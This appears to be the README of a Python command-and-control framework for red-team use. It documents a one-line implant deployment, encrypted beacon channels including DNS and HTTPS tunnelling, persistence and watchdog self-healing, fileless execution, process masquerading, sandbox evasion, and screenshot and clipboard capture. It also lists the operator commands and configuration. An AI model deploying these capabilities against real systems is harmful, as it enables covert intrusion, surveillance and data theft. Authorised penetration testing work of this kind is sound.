# PyExec2 — 纯 Python C2 框架

PyExec2 是一个**纯标准库（zero-dependency）**的命令与控制（C2）框架：
单文件 implant 部署、加密帧协议、多传输通道（TCP/TLS/HTTPS/DNS）、
socks5 动态代理、端口转发、持久化与自愈。面向授权红队/渗透测试场景。

```
┌────────────┐  TCP 9001 (XOR+zlib 帧)  ┌───────────┐  TLS  ┌─────────────┐
│  Beacon    │ ◄───────────────────────► │  Server   │ ◄──── │  Proxy 中转  │
│ (implant)  │  TLS/HTTPS/DNS 可选通道    │ (9001/9002│       │ (生成的代码) │
│            │  UDP 9001 心跳              │  +https/  │       └─────────────┘
└────────────┘                            │  dns/relay│  TCP 9002 (client)
                                          │  /socks5) │ ◄─────────────────────► 操作员 Client
                                          └───────────┘                          (client.py)
```

---

## 特性

- **纯 stdlib**：implant / server / client 全部只用 Python 标准库，无 pip 依赖
- **加密帧协议**：`[4B 长度][Base64(XOR(zlib(payload)))]`，32 字节 XOR 密钥
  （zlib 压缩内置，1MB 大结果压缩后显著缩小）
- **多传输通道**：TCP 直连（基线）→ uplevel 平滑升级到
  TLS（proxy 中转）/ HTTPS（POST 隧道）/ DNS（查询隧道），失败自动回滚无失联窗口
- **无文件执行**：单行 `echo "bootstrap" | python3` 部署，bootstrap 随机单字节混淆
- **心跳保活**：长任务执行期间 UDP 心跳（HMAC 认证）刷新 last_seen，
  跑 5 分钟任务不再误判离线
- **文件传输**：download/upload 分块自动续传（~250KB/块），大文件 md5 完整
- **socks5 动态代理**：操作机 proxychains 挂 server，直接访问目标内网任意主机任意端口
- **端口转发**：把内网端口映射到 server 本地（如 13389 → 内网 3389 RDP）
- **交互式 shell**：持久子进程（sh/cmd），cd/环境变量状态保留；fork 分裂独立 beacon；
  break 逐层退出
- **持久化与自愈**：cron/systemd/bashrc/注册表 Run/计划任务；
  survive 双路径 watchdog 自动拉起
- **取证模块**：Windows 截图（PowerShell System.Drawing）、剪贴板抓取、
  进程伪装（prctl/标题）、沙箱/VM 自检、memfd 无文件执行
- **运维**：beacon 标签分组、`broadcast @组` 定向下发、事件审计
  events.jsonl、reload 热生效（exec_timeout 等）、远程 client 操作
- **资源上限全部配置化**：连接数/帧大小/结果大小/任务数/超时

---

## 目录结构

```
pyexec-c2-main/
├── server/
│   ├── server.py                 # Server 主程序（headless 可选）
│   ├── listener.py               # 多角色 TCP 监听（beacon/client 端口强绑定）
│   ├── core/                     # 协议/加密/配置/bootstrap
│   │   ├── protocol.py           # 帧编解码 + 消息校验
│   │   ├── crypto.py             # XOR+zlib+Base64
│   │   ├── config.py             # ServerConfig/ClientConfig + validate
│   │   └── bootstrap.py          # 单行部署命令生成
│   ├── engine/
│   │   ├── dispatcher.py         # 命令路由 + 模块任务构建
│   │   └── commands/             # 内置命令（beacon/use/show/broadcast/tag/...）
│   ├── sessions/                 # BeaconSession / ClientSession / 握手
│   ├── infra/                    # https_listener / dns_listener / relay / event_writer
│   ├── modules/                  # beacon 端模块（exec/shell/persist/...）
│   ├── s_modules/                # server 端生成器（build/proxy/transport_*/keygen）
│   ├── implant/implant_template.py  # beacon 模板（{{占位符}} 渲染）
│   └── config.json               # server 配置（密钥/端口/上限）
├── client/
│   ├── client.py                 # 操作员 Client（交互/单行模式）
│   ├── remote_client.py          # 加密通信层
│   └── config.json               # client 配置（server_host/client_port/client_key）
└── tests/                        # pytest 全量（227 绿）
```

---

## 快速开始

### 1. Server 启动

```bash
cd server
python3 server.py                 # 交互控制台
python3 server.py --headless      # 无控制台（配合远程 client）
python3 server.py --port 9001 --host 0.0.0.0
```

首次启动自动生成 `config.json`（含随机 implant_key/client_key）。

### 2. 生成部署命令

```console
pyexec> s_exec keygen                       # 重新生成密钥（改 key 后需重启 server）
pyexec> s_exec build 192.168.1.10 9001      # host=Server 地址
```

`build` 输出单行部署命令（`echo "..." | python3`），复制到目标机执行。
产物落盘：`server/s_modules/output/`（implant_command.txt / xor_key.hex）。

### 3. 目标机上线

```console
pyexec> beacon            # 看到新 beacon（Windows-10 平台）
pyexec> use 97af5ff3061c257e
pyexec> exec whoami
```

### 4. 远程操作（headless）

```bash
cd client
python3 client.py          # 交互模式，命令与 server 控制台一致
python3 client.py -c "beacon"
```

---

## 配置（server/config.json）

| 字段 | 默认 | 说明 |
|------|------|------|
| server_host / server_port | 0.0.0.0 / 9001 | implant 监听 |
| client_port | 9002 | 操作员 client 监听 |
| implant_key / client_key | 随机 64hex | 通信密钥（XOR 32 字节） |
| max_connections / max_frame_size | 256 / 512KB | 资源上限 |
| max_result_size / max_task_code_size | 1MB / 256KB | 结果/任务代码上限 |
| max_tasks_per_client / max_results_per_beacon | 100 / 200 | 队列/结果条数 |
| socket_timeout / client_timeout | 30s / 300s | 空闲超时 / 长任务结果等待 |
| exec_timeout | 300s | exec 模块命令超时 |
| client_tls | false | client 通道 TLS（自签证书防嗅探） |
| https_port / dns_port | 0（禁用） | HTTPS/DNS 传输监听端口 |
| relay_port / socks5_port | 0（禁用） | 中继通道 / SOCKS5 代理端口 |
| auto_commands | [] | beacon 上线自动执行（如 `["set_interval 5"]`） |

`reload` 命令热生效（exec_timeout/上限等）；端口/密钥类变更需重启。

---

## 命令参考

### 信息与管理
```
beacon                    列出 beacon（ID/Fork/Tag/Last/User/Plat/OS）
use <bid>                 选中当前 beacon
show [bid]                详情（通道/via/标签/元数据）
platform [bid] <linux|windows|macos>   手动设平台
result [bid] [n]          查看最近 n 条结果
info <module>             模块参数说明
config                    当前配置
log [n]                   事件审计尾部
reload                    热重载配置 + 重扫模块
```

### 任务下发
```
exec <cmd...>             执行命令（rest 参数，timeout 来自 exec_timeout）
raw [bid] <python代码>    原样 Python 代码（保留引号）
ls [path] / find <keyword> [path] / cat <path> / ps / netstat / sysinfo
screenshot / clipboard / masquerade [name] / sandbox_check
memfd <b64脚本>           无文件执行（Linux memfd_create；Windows 出 powershell -enc）
persist <target> <payload>   cron|systemd|bashrc|registry|schtasks
survive <payload> <marker>   双路径自愈（主 + watchdog 每分钟拉起）
shell                     进入交互式 shell（exit/break 退出）
fork                      分裂独立 beacon（break 单独退出）
download <bid> <远程> <本地>   分块自动续传下载
upload <bid> <本地> <远程>     分块上传
```

### 横向与传输
```
portfwd <bid> <本地端口> <目标host> <目标port>   端口映射到 server 本地
uplevel [bid] tls|https|dns <host> <port> <key> [fingerprint]   通道升级
s_exec build|proxy|keygen|transport_* ...        server 端生成器
tag <bid> <标签...> / tag @组 <新标签>           分组
broadcast [@组] <module> [args...]               批量下发
```

### SOCKS5 代理
```bash
# config.json 启用: "socks5_port": 1080, "relay_port": 18080（重启生效）
pyexec> use <bid>                     # 转发目标 = 当前选中 beacon
# 操作机:
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains4 curl http://<内网目标>/
```

---

## 传输通道

| 通道 | 端口 | 说明 |
|------|------|------|
| TCP 直连 | 9001 | 基线，XOR+zlib 帧 |
| TLS（proxy 中转） | 随机 | `s_exec proxy <host> <port>` 生成中转代码；自签证书 + 指纹校验 |
| HTTPS | https_port | 无状态 POST 轮询 `/poll/<bid>`，单帧响应 |
| DNS | dns_port | 查询域名分片（≤60 字符/段）+ TXT 多片响应；适合信令/小数据 |
| client 通道 | 9002 | 操作员连接；client_tls 可选 |

`uplevel` 两阶段升级：先切新传输探测连接，成功提交、失败回滚（无失联窗口）。

---

## 事件审计

所有事件写入 `server/data/events.jsonl`（JSON Lines，自动轮转）：
`connect / disconnect / task_sent / task_result / uplevel / server_start...`
console 尾部实时渲染，`log` 命令查看。

---

## 测试

```bash
.venv/bin/python -m pytest -q     # 227 全绿
```

测试覆盖：协议/加密、dispatcher、模块构建、会话生命周期、shell/fork e2e、
TLS/HTTPS/DNS 传输、relay/socks5 全链路、心跳、配置、资源上限、修复回归。
集成测试用临时端口（19001+），不碰正式实例。

真实机器验证见 `test_report.md`（2026-08-07：全模块 + 三通道传输真机通过）。

---

## 安全与合规

- **仅限授权环境使用**（自有资产 / 签署授权的红队与渗透测试）
- 持久化（persist/survive）与横向（socks5/portfwd）模块在客户环境测试后
  必须清理（见 plan.md 阶段 6/7 清理命令）
- 密钥即控制权：implant_key/client_key 泄漏等于失守，定期 `s_exec keygen` 轮换
  （keygen 后必须重启 server）
- 默认仅自签证书防被动嗅探（CERT_NONE），高威胁环境请叠加网络层防护
- 审计事件留痕，便于应急溯源

---

## 已知限制

- 长任务上限 = client_timeout（300s）：超过会断连重发（设计取舍，心跳防误判）
- DNS 通道请求方向受域名长度限制，大结果慢——适合信令/小数据，文件传输走主通道
- beacon 任务代码与 beacon 共享全局（模块可读 `_K`/`_D` 等）——仅信任自己下发的任务
- Windows 取证模块依赖 PowerShell 执行策略放行（screenshot/clipboard/memfd）
